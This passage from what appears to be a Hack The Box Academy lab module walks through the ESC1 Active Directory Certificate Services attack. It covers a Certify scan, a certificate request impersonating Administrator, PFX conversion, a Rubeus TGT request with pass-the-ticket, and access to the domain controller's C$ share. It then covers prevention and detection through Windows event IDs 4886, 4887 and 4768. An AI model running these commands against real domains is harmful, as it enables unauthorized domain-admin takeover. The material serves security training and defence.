  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=eagle,DC=local'

[*] Listing info about the Enterprise CA 'eagle-PKI-CA'

    Enterprise CA Name            : eagle-PKI-CA
    DNS Hostname                  : PKI.eagle.local
    FullName                      : PKI.eagle.local\eagle-PKI-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=eagle-PKI-CA, DC=eagle, DC=local
    Cert Thumbprint               : 7C59C4910A1C853128FE12C17C2A54D93D1EECAA
    Cert Serial                   : 780E7B38C053CCAB469A33CFAAAB9ECE
    Cert Start Date               : 09/08/2022 14.07.25
    Cert End Date                 : 09/08/2522 14.17.25
    Cert Chain                    : CN=eagle-PKI-CA,DC=eagle,DC=local
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-32</span><span class="hljs-string">-544</span>

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-11</span>
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-32</span><span class="hljs-string">-544</span>
      Allow  ManageCA, ManageCertificates               EAGLE\Domain Admins           S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-1518138621</span><span class="hljs-string">-4282902758</span><span class="hljs-string">-752445584</span><span class="hljs-string">-512</span>
      Allow  ManageCA, ManageCertificates               EAGLE\Enterprise Admins       S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-1518138621</span><span class="hljs-string">-4282902758</span><span class="hljs-string">-752445584</span><span class="hljs-string">-519</span>
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : PKI.eagle.local\eagle-PKI-CA
    Template Name                         : UserCert
    Schema Version                        : 4
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email, Smart Card Log-on
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email, Smart Card Log-on
    Permissions
      Enrollment Permissions
        Enrollment Rights           : EAGLE\Domain Admins           S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-1518138621</span><span class="hljs-string">-4282902758</span><span class="hljs-string">-752445584</span><span class="hljs-string">-512</span>
                                      EAGLE\Domain Users            S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-1518138621</span><span class="hljs-string">-4282902758</span><span class="hljs-string">-752445584</span><span class="hljs-string">-513</span>
                                      EAGLE\Enterprise Admins       S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-1518138621</span><span class="hljs-string">-4282902758</span><span class="hljs-string">-752445584</span><span class="hljs-string">-519</span>
      Object Control Permissions
        Owner                       : EAGLE\Administrator           S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-1518138621</span><span class="hljs-string">-4282902758</span><span class="hljs-string">-752445584</span><span class="hljs-string">-500</span>
        WriteOwner Principals       : EAGLE\Administrator           S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-1518138621</span><span class="hljs-string">-4282902758</span><span class="hljs-string">-752445584</span><span class="hljs-string">-500</span>
                                      EAGLE\Domain Admins           S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-1518138621</span><span class="hljs-string">-4282902758</span><span class="hljs-string">-752445584</span><span class="hljs-string">-512</span>
                                      EAGLE\Enterprise Admins       S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-1518138621</span><span class="hljs-string">-4282902758</span><span class="hljs-string">-752445584</span><span class="hljs-string">-519</span>
        WriteDacl Principals        : EAGLE\Administrator           S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-1518138621</span><span class="hljs-string">-4282902758</span><span class="hljs-string">-752445584</span><span class="hljs-string">-500</span>
                                      EAGLE\Domain Admins           S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-1518138621</span><span class="hljs-string">-4282902758</span><span class="hljs-string">-752445584</span><span class="hljs-string">-512</span>
                                      EAGLE\Enterprise Admins       S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-1518138621</span><span class="hljs-string">-4282902758</span><span class="hljs-string">-752445584</span><span class="hljs-string">-519</span>
        WriteProperty Principals    : EAGLE\Administrator           S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-1518138621</span><span class="hljs-string">-4282902758</span><span class="hljs-string">-752445584</span><span class="hljs-string">-500</span>
                                      EAGLE\Domain Admins           S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-1518138621</span><span class="hljs-string">-4282902758</span><span class="hljs-string">-752445584</span><span class="hljs-string">-512</span>
                                      EAGLE\Enterprise Admins       S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-1518138621</span><span class="hljs-string">-4282902758</span><span class="hljs-string">-752445584</span><span class="hljs-string">-519</span>

Certify completed in 00:00:00.9120044
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A13/certifyRequest.png" alt="Certify scan for vulnerable templates"></p>
<p>When checking the &#39;Vulnerable Certificate Templates&#39; section from the output of Certify, we will see that a single template with plenty of information about it is listed. We can tell that the name of the CA in the environment is <code>PKI.eagle.local\\eagle-PKI-CA</code>, and the vulnerable template is named <code>UserCert</code>. The template is vulnerable because:</p>
<ul>
<li>All Domain users can request a certificate on this template.</li>
<li>The flag <a href="https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1">CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</a> is present, allowing the requester to specify the <code>SAN</code> (therefore, any user can request a certificate as any other user in the network, including privileged ones).</li>
<li>Manager approval is not required (the certificate gets issued immediately after the request without approval).</li>
<li>The certificate can be used for &#39;Client Authentication&#39; (we can use it for login/authentication).</li>
</ul>
<p>To abuse this template, we will use <code>Certify</code> and pass the argument <code>request</code> by specifying the full name of the CA, the name of the vulnerable template, and the name of the user, for example, <code>Administrator</code>:</p>
<p>PKI - ESC1</p>
<pre><code class="lang-powershell-session">PS C:\Users\bob\Downloads&gt; .\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator

   _____          _   _  __
  / ____|<span class="hljs-string">        </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> (_)/ _</span>|
 |<span class="hljs-string"> </span>|<span class="hljs-string">     ___ _ __</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_ _</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_ _   _
 </span>|<span class="hljs-string"> </span>|<span class="hljs-string">    / _ \ '__</span>|<span class="hljs-string"> __</span>|<span class="hljs-string"> </span>|<span class="hljs-string">  _</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|
 |<span class="hljs-string"> </span>|<span class="hljs-string">___</span>|<span class="hljs-string">  __/ </span>|<span class="hljs-string">  </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|
  \_____\___|<span class="hljs-string">_</span>|<span class="hljs-string">   \__</span>|<span class="hljs-string">_</span>|<span class="hljs-string">_</span>|<span class="hljs-string">  \__, </span>|
                             __/ |<span class="hljs-string">
                            </span>|<span class="hljs-string">___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : EAGLE\bob
[*] No subject name specified, using current context as subject.

[*] Template                : UserCert
[*] Subject                 : CN=bob, OU=EagleUsers, DC=eagle, DC=local
[*] AltName                 : Administrator

[*] Certificate Authority   : PKI.eagle.local\eagle-PKI-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 36

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIE...
&lt;SNIP&gt;
&lt;SNIP&gt;
wgP7EwPpxHKOrlZr6H+5lS58u/9EuIgdSk1X3VWuZvWRdjL15ovn
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGLzCCBRegAwIBAgITFgAAACx6zV6bbfN1ZQAAAAAALDANBgkqhkiG9w0BAQsF
&lt;SNIP&gt;
&lt;SNIP&gt;
eVAB
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx


Certify completed in 00:00:15.8803493</span>
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A13/requestCert.png" alt="Certify request certificate"></p>
<p>Once the attack finishes, we will obtain a certificate successfully. The command generates a <code>PEM</code> certificate and displays it as base64. We need to convert the <code>PEM</code> certificate to the <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/install/personal-information-exchange---pfx--files">PFX</a> format by running the command mentioned in the output of Certify (when asked for the password, press <code>Enter</code> without providing one), however, to be on the safe side, let&#39;s first execute the below command to avoid bad formatting of the <code>PEM</code> file.</p>
<p>PKI - ESC1</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sed -i 's/<span class="hljs-symbol">\s</span><span class="hljs-symbol">\s</span><span class="hljs-symbol">\+</span>/<span class="hljs-symbol">\n</span>/g' cert.pem
</code></pre>
<p>Then we can execute the <code>openssl</code> command mentioned in the output of Certify.</p>
<p>PKI - ESC1</p>
<pre><code class="lang-shell-session">root<span class="hljs-keyword">@htb</span>[/htb]$ openssl pkcs12 -<span class="hljs-keyword">in</span> cert.pem -keyex -CSP <span class="hljs-string">"Microsoft Enhanced Cryptographic Provider v1.0"</span> -<span class="hljs-keyword">export</span> -<span class="hljs-keyword">out</span> cert.pfx
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A13/convertPEM.png" alt="Convert PEM to PFX"></p>
<p>Now that we have the certificate in a usable <code>PFX</code> format (which <code>Rubeus</code> supports), we can request a Kerberos TGT for the account <code>Administrator</code> and authenticate with the certificate:</p>
<p>PKI - ESC1</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-string">C:</span>\Users\bob\Downloads&gt; .\Rubeus.exe asktgt <span class="hljs-regexp">/domain:eagle.local /</span><span class="hljs-string">user:</span>Administrator <span class="hljs-regexp">/certificate:cert.pfx /</span><span class="hljs-string">dc:</span>dc1.eagle.local /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  <span class="hljs-regexp">/| | | |  _ \| ___ | | | |/</span>___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____<span class="hljs-regexp">/|____/</span>|_____)____<span class="hljs-regexp">/(___/</span>

  v2<span class="hljs-number">.0</span><span class="hljs-number">.1</span>

[*] <span class="hljs-string">Action:</span> Ask TGT

[*] Using PKINIT with etype rc4_hmac and <span class="hljs-string">subject:</span> CN=bob, OU=EagleUsers, DC=eagle, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) <span class="hljs-string">for:</span> <span class="hljs-string">'eagle.local\Administrator'</span>
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGVjCCBlKgAwIBBaEDAgEWooIFaTCCBWVhggVhMIIFXaADAgEFoQ0bC0VBR0xFLkxPQ0FMoiAwHqAD
      AgECoRcwFRsGa3JidGd0GwtlYWdsZS5sb2NhbKOCBSMwggUfoAMCARKhAwIBAqKCBREEggUN/<span class="hljs-number">0</span>cVeDEy
      +dWkCObsKvVAhfrZdORL3htCnalVR1GYRWahL2KRC3dFKGMU8z9RxXNGBRxnx2jOQA7KIpTKAl56pHMm
      XGp78caInKsbfF/CdLKdzayIRZH0scYWIMflA+M3crgUw6UFw6QNywLElxhsN1eWv14CAx52i+IcZulx
      ZX1Ldq9JZIDd89rV916j3Lx9f4BGNYU4tqUG3adHoJF<span class="hljs-regexp">/YH/</span>LABc21YJaG88qoAju5I1/LlVBAwStAU7t
      Sw4OAn3lsau8St4IY+pbzX5pM25nSjZBwjk5sv7OmWGLUO74l5DgVDwdfLKiulAt5dze4OjBez0LDPdo
      pP1+fFE0xXaYSAiccAkudm7OYScbnl7Leaz+<span class="hljs-number">4</span>xrgXFWkPaOqJR+CyReovaBozcM/<span class="hljs-number">02</span>Hf7klxChHQ5TP1
      <span class="hljs-number">4</span>zEaf+XVqbUcv+dNL4TN1kNK90+P+CdtV7RVXdIOYDsdTkRroXxuuafLFE5zR4OvUh73<span class="hljs-regexp">/Ch/</span>Z0jTAMbP
      <span class="hljs-number">2</span>d0x7CNyqzWvJcmeoLn2Z/YjqfrvyXgSywHdpGCQ05F3S5kz1YChG7n+DyYdxhuDGBthTy82+gzz4il8
      ZOzT<span class="hljs-regexp">/01PDJ8oqWNXLDGd9j3y3Fh8mbMZ3jnuJjA2OSxSooUS+rH0f/</span>j4hdNWgryeDHScR8U<span class="hljs-regexp">/Tm/</span>awwv4
      <span class="hljs-number">7</span>sFD5i8iK5mtn7gGpn5vzK2zoZ1jq8j++<span class="hljs-number">33</span>P6sMnzNgf33l1fOeKR6ggyFKZq9WIGUJjkZ4tcTI2Ufb7
      lLbG23ycyUgqU1aouPAWBWxrCa0xm8nVcnfJOtTVlDY71N4gNx8kqDCDDfjAjz6mqrOzZAGYWHKx1/Oy
      x7zU+W3cKdTIhQh1nN9NY9Zwc/ioJfVBhKY83KZSt7yqJoTR5j7ZztJf4uXQS7EaFzUvRJKBs5xhhwGx
      UsVqGz<span class="hljs-regexp">/GM5i2J8sC7dOQj76T4nMggczbIhR6va1K/</span><span class="hljs-number">2</span>OiVbHGvJb/U+iOfenBIeqryBXW41hyxXWGNtNO
      Tr1pEbJZDIVgrHLh3LzFDHR7zSBjxXE+D9JihuHWDy2hpR+H9HD3KE9ixkjPA5GjXj0R5ikgwdw1SvZl
      yxtLNwDmgbL3ObKsyagKcNYqaN8zky2oSA7ofGL03er+TFLqyMOBh4tEiZTGBkcroX+BpgAC8vA9CFet
      RzlZ+AQRB1+ngimkt6nLeAsdH8+pm8RnWAAtvV<span class="hljs-regexp">/2DZ984WjiDVV8WvvvNoaHt438vRcu7QT8cW/</span>dgeF8
      wmXBJnrI5adpzo+<span class="hljs-number">7</span>p0LnPtMIe<span class="hljs-regexp">/02jDgmFRQrAiYtFvhO1BLtWm3ZVe+1/</span>dinsWneuj5APkDIfLSXR2x/
      TU3Waoko5UPjuUn0BQaKWBQQ2OvPF<span class="hljs-regexp">/m79sqz4HLRoAORHvJvCzetebdpbPpfWWdeNeeHs1/</span>Yh2Dj0/s7
      UbQNFmj94yWRM<span class="hljs-regexp">/QcvZz9SKmBLOhp3tMTvUdpDVupliqKaYzuZieiBP/</span>HzaHGt5DcyrsKyJcXQw9upUjz
      XWyWhPIdDOhmZ+aHMh0PMwZpELtZ5NknY2wzxguP3jrTUm1cwXPlGLWvIw4DLAtlFGnd2ladNj33filP
      aUqsWreo6RYcRkHrDmUUAUrUFP<span class="hljs-regexp">/+72DG5ms70/</span>ncq7XhgOnHaeNg+CKU8tQ0J710HuyeVqFYWRa6nOOB
      WPFCQOSaULrrLDdJGqqtbAof4Hi1bgH3WGdtZyRkoWmF<span class="hljs-regexp">/gQR/</span>BdE1yx1okqNnM99EjcuuHaJHy+og+x/
      LU4Ehd9uzdB4o0X2t72v9gjUJTiFRHPP3/<span class="hljs-number">6</span>bo4HYMIHVoAMCAQCigc0Egcp9gccwgcSggcEwgb4wgbug
      GzAZoAMCARehEgQQKQTCgNhj3sh4yXvrBwTfeqENGwtFQUdMRS5MT0NBTKIaMBigAwIBAaERMA8bDUFk
      bWluaXN0cmF0b3KjBwMFAEDhAAClERgPMjAyMjEyMTkyMDA0NTNaphEYDzIwMjIxMjIwMDYwNDUzWqcR
      GA8yMDIyMTIyNjIwMDQ1M1qoDRsLRUFHTEUuTE9DQUypIDAeoAMCAQKhFzAVGwZrcmJ0Z3QbC2VhZ2xl
      LmxvY2Fs
[+] Ticket successfully imported!

  <span class="hljs-string">ServiceName              :</span>  krbtgt/eagle.local
  <span class="hljs-string">ServiceRealm             :</span>  EAGLE.LOCAL
  <span class="hljs-string">UserName                 :</span>  Administrator
  <span class="hljs-string">UserRealm                :</span>  EAGLE.LOCAL
  <span class="hljs-string">StartTime                :</span>  <span class="hljs-number">19</span><span class="hljs-regexp">/12/</span><span class="hljs-number">2022</span> <span class="hljs-number">21.04</span><span class="hljs-number">.53</span>
  <span class="hljs-string">EndTime                  :</span>  <span class="hljs-number">20</span><span class="hljs-regexp">/12/</span><span class="hljs-number">2022</span> <span class="hljs-number">07.04</span><span class="hljs-number">.53</span>
  <span class="hljs-string">RenewTill                :</span>  <span class="hljs-number">26</span><span class="hljs-regexp">/12/</span><span class="hljs-number">2022</span> <span class="hljs-number">21.04</span><span class="hljs-number">.53</span>
  <span class="hljs-string">Flags                    :</span>  name_canonicalize, pre_authent, initial, renewable, forwardable
  <span class="hljs-string">KeyType                  :</span>  rc4_hmac
  Base64(key)              :  KQTCgNhj3sh4yXvrBwTfeg==
  ASREP (key)              :  <span class="hljs-number">2</span>EB79553702442F11E93044E3C915490
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A13/certLogin.png" alt="Get TGT for Administrator"></p>
<p>After successful authentication, we will be able to list the content of the <code>C$</code> share on DC1:</p>
<p>PKI - ESC1</p>
<pre><code class="lang-powershell-session"><span class="hljs-comment">PS</span> <span class="hljs-comment">C:\Users\bob\Downloads</span>&gt; <span class="hljs-comment">dir</span> <span class="hljs-comment">\\dc1\c$</span>

    <span class="hljs-comment">Directory:</span> <span class="hljs-comment">\\dc1\c$</span>


<span class="hljs-comment">Mode</span>                 <span class="hljs-comment">LastWriteTime</span>         <span class="hljs-comment">Length</span> <span class="hljs-comment">Name</span>
<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>                 <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>         <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>
<span class="hljs-comment">d</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>        <span class="hljs-comment">10/15/2022</span>   <span class="hljs-comment">6:30</span> <span class="hljs-comment">PM</span>                <span class="hljs-comment">DFSReports</span>
<span class="hljs-comment">d</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>        <span class="hljs-comment">10/13/2022</span>  <span class="hljs-comment">11:23</span> <span class="hljs-comment">PM</span>                <span class="hljs-comment">Mimikatz</span>
<span class="hljs-comment">d</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>          <span class="hljs-comment">9/1/2022</span>   <span class="hljs-comment">9:49</span> <span class="hljs-comment">PM</span>                <span class="hljs-comment">PerfLogs</span>
<span class="hljs-comment">d</span><span class="hljs-literal">-</span><span class="hljs-comment">r</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>        <span class="hljs-comment">11/28/2022</span>  <span class="hljs-comment">10:59</span> <span class="hljs-comment">AM</span>                <span class="hljs-comment">Program</span> <span class="hljs-comment">Files</span>
<span class="hljs-comment">d</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>          <span class="hljs-comment">9/1/2022</span>   <span class="hljs-comment">2:02</span> <span class="hljs-comment">PM</span>                <span class="hljs-comment">Program</span> <span class="hljs-comment">Files</span> <span class="hljs-comment">(x86)</span>
<span class="hljs-comment">d</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>        <span class="hljs-comment">12/13/2022</span>  <span class="hljs-comment">11:22</span> <span class="hljs-comment">AM</span>                <span class="hljs-comment">scripts</span>
<span class="hljs-comment">d</span><span class="hljs-literal">-</span><span class="hljs-comment">r</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>          <span class="hljs-comment">8/7/2022</span>   <span class="hljs-comment">9:31</span> <span class="hljs-comment">PM</span>                <span class="hljs-comment">Users</span>
<span class="hljs-comment">d</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>        <span class="hljs-comment">11/28/2022</span>  <span class="hljs-comment">11:27</span> <span class="hljs-comment">AM</span>                <span class="hljs-comment">Windows</span>
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A13/dirDC1.png" alt="Directory listing of C$ on DC1"></p>
<hr>
<h3 id="prevention">Prevention</h3>
<p>The attack would not be possible if the <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> flag is not enabled in the certificate template. Another method to thwart this attack is to require <code>CA certificate manager approval</code> before issuing certificates; this will ensure that no certificates on potentially dangerous templates are issued without manual approval (which hopefully correlates that the request originated from a legit user).</p>
<p>Because there are many different privilege escalation techniques, it is highly advised to regularly scan the environment with <code>Certify</code> or other similar tools to find potential PKI issues.</p>
<hr>
<h3 id="detection">Detection</h3>
<p>When the CA generates the certificate, two events will be logged, one for the received request and one for the issued certificate, if it succeeds. Those events have the IDs of <code>4886</code> and <code>4887</code> as shown below:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A13/eventBob.png" alt="Bob requests certificate"></p>
<p>Unfortunately, we can only tell that Bob requested a certificate from WS001; we cannot know if the request specified the SAN.</p>
<p>The CA contains a list of all issued certificates, so if we look there, we will see the request for certificate ID 36 (the one from the attack scenario above):</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A13/detectCert1.png" alt="Bob issued certificate"></p>
<p>The general overview of the GUI tool does not display the SAN either, but we can tell that a certificate was issued via the vulnerable template. If we want to find the SAN information, we&#39;ll need to open the certificate itself:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A13/detectCert2.png" alt="Bob issued certificate"></p>
<p>There is also the possibility to view that programmatically: the command <code>certutil -view</code> will dump everything on the CA with all of the information about each certificate (this can be massive in a large environment):</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A13/certpieces.png" alt="certutil"></p>
<p>With some scripting, we can automate parsing and discovery of abused vulnerable templates by threat agents.</p>
<p>Finally, if you recall, in the attack, we used the obtained certificate for authentication and obtained a TGT; AD will log this request with the event ID <code>4768</code>, which will specifically have information about the logon attempt with a certificate:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A13/detect1.png" alt="Logon with certificate"></p>
<p>Note that events <code>4886</code> and <code>4887</code> will be generated on the machine issuing the certificate rather than the domain controller. If GUI access is not available, we can use PSSession to interact with the PKI machine, and the <code>Get-WinEvent</code> cmdlet to search for the events:</p>
<p>PKI - ESC1</p>
<pre><code class="lang-cmd-session"><span class="hljs-string">C:</span>\Users\bob\Downloads&gt;runas /<span class="hljs-string">user:</span>eagle\htb-student powershell

Enter the password <span class="hljs-keyword">for</span> eagle\htb-<span class="hljs-string">student:</span>
Attempting to start powershell <span class="hljs-keyword">as</span> user <span class="hljs-string">"eagle\htb-student"</span> ...
</code></pre>
<p>PKI - ESC1</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-keyword">C</span>:\WINDOWS\system32&gt; New-PSSession PKI

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  <span class="hljs-number">4</span> WinRM4          PKI             RemoteMachine   Opened        Microsoft.PowerShell     Available

PS <span class="hljs-keyword">C</span>:\WINDOWS\system32&gt; <span class="hljs-keyword">Enter</span>-PSSession PKI

[PKI]: PS <span class="hljs-keyword">C</span>:\Users\htb-student\Documents&gt; <span class="hljs-keyword">Get</span>-WINEvent -FilterHashtable @{Logname='Security'; ID='4886'}


   ProviderName: Microsoft-Windows-Security-Auditing

TimeCreated                     Id LevelDisplayName <span class="hljs-keyword">Message</span>
-----------                     -- ---------------- -------
<span class="hljs-number">4</span>/<span class="hljs-number">13</span>/<span class="hljs-number">2023</span> <span class="hljs-number">4</span>:<span class="hljs-number">05</span>:<span class="hljs-number">50</span> PM          <span class="hljs-number">4886</span> <span class="hljs-keyword">Information</span>      Certificate Services received a certificate request....
<span class="hljs-number">4</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2023</span> <span class="hljs-number">1</span>:<span class="hljs-number">24</span>:<span class="hljs-number">02</span> PM          <span class="hljs-number">4886</span> <span class="hljs-keyword">Information</span>      Certificate Services received a certificate request....
<span class="hljs-number">4</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2023</span> <span class="hljs-number">1</span>:<span class="hljs-number">15</span>:<span class="hljs-number">01</span> PM          <span class="hljs-number">4886</span> <span class="hljs-keyword">Information</span>      Certificate Services received a certificate request....


[PKI]: PS <span class="hljs-keyword">C</span>:\Users\htb-student\Documents&gt; <span class="hljs-keyword">Get</span>-WINEvent -FilterHashtable @{Logname='Security'; ID='4887'}


   ProviderName: Microsoft-Windows-Security-Auditing

TimeCreated                     Id LevelDisplayName <span class="hljs-keyword">Message</span>
-----------                     -- ---------------- -------
<span class="hljs-number">4</span>/<span class="hljs-number">13</span>/<span class="hljs-number">2023</span> <span class="hljs-number">4</span>:<span class="hljs-number">06</span>:<span class="hljs-number">05</span> PM          <span class="hljs-number">4887</span> <span class="hljs-keyword">Information</span>      Certificate Services approved a certificate request and...
<span class="hljs-number">4</span>/<span class="hljs-number">13</span>/<span class="hljs-number">2023</span> <span class="hljs-number">4</span>:<span class="hljs-number">06</span>:<span class="hljs-number">02</span> PM          <span class="hljs-number">4887</span> <span class="hljs-keyword">Information</span>      Certificate Services approved a certificate request and...
<span class="hljs-number">4</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2023</span> <span class="hljs-number">1</span>:<span class="hljs-number">24</span>:<span class="hljs-number">14</span> PM          <span class="hljs-number">4887</span> <span class="hljs-keyword">Information</span>      Certificate Services approved a certificate request and...
<span class="hljs-number">4</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2023</span> <span class="hljs-number">1</span>:<span class="hljs-number">24</span>:<span class="hljs-number">14</span> PM          <span class="hljs-number">4887</span> <span class="hljs-keyword">Information</span>      Certificate Services approved a certificate request and...
<span class="hljs-number">4</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2023</span> <span class="hljs-number">1</span>:<span class="hljs-number">15</span>:<span class="hljs-number">12</span> PM          <span class="hljs-number">4887</span> <span class="hljs-keyword">Information</span>      Certificate Services approved a certificate request and..
</code></pre>
<p>To view the full audit log of the events, we can pipe the output into <code>Format-List</code> , or save the events in an array and check them individually:</p>
<p>PKI - ESC1</p>
<pre><code class="lang-powershell-session">[pki]: PS <span class="hljs-string">C:</span>\Users\htb-student\Documents&gt; $events = Get-WinEvent -FilterHashtable @{Logname=<span class="hljs-string">'Security'</span>; ID=<span class="hljs-string">'4886'</span>}
[pki]: PS <span class="hljs-string">C:</span>\Users\htb-student\Documents&gt; $events[<span class="hljs-number">0</span>] | Format-List -Property *


<span class="hljs-string">Message              :</span> Certificate Services received a certificate request.

                       Request <span class="hljs-string">ID:</span>      <span class="hljs-number">51</span>
<span class="hljs-symbol">                       Requester:</span>       EAGLE\DC2$
<span class="hljs-symbol">                       Attributes:</span>
<span class="hljs-symbol">                       CertificateTemplate:</span>DomainController
<span class="hljs-symbol">                       ccm:</span>PKI.eagle.local
<span class="hljs-string">Id                   :</span> <span class="hljs-number">4886</span>
<span class="hljs-string">Version              :</span> <span class="hljs-number">0</span>
<span class="hljs-string">Qualifiers           :</span>
<span class="hljs-string">Level                :</span> <span class="hljs-number">0</span>
<span class="hljs-string">Task                 :</span> <span class="hljs-number">12805</span>
<span class="hljs-string">Opcode               :</span> <span class="hljs-number">0</span>
<span class="hljs-string">Keywords             :</span> <span class="hljs-number">-9214364837600034816</span>
<span class="hljs-string">RecordId             :</span> <span class="hljs-number">21100</span>
<span class="hljs-string">ProviderName         :</span> Microsoft-Windows-Security-Auditing
